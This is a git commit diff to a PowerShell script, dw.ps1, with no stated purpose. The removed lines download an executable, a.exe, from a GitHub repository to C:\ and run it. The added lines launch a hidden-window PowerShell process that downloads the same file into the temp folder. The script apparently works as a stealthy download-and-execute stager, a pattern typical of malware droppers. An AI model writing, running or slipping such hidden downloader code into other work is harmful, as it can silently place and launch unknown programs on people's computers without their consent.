c60041b5f2d22c5bb9e600e482f6fa5a93f49617
Sxcrate <88933467+sxcrate@users.noreply.github.com>
2024-04-17 11:52:03 +0200

    Update dw.ps1

--- dw.ps1
+++ dw.ps1
@@ -1,6 +1,4 @@
-$url = "https://github.com/sxcrate/utils/raw/main/a.exe"
-$dest = "C:\a.exe"
-Invoke-RestMethod -Uri $url -OutFile $dest
-& "C:\a.exe"
+Start-Process -FilePath "powershell" -ArgumentList "/c cd $Env:temp
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/sxcrate/utils/main/a.exe' -OutFile 'a.exe'
 exit" -WindowStyle Hidden
 exit
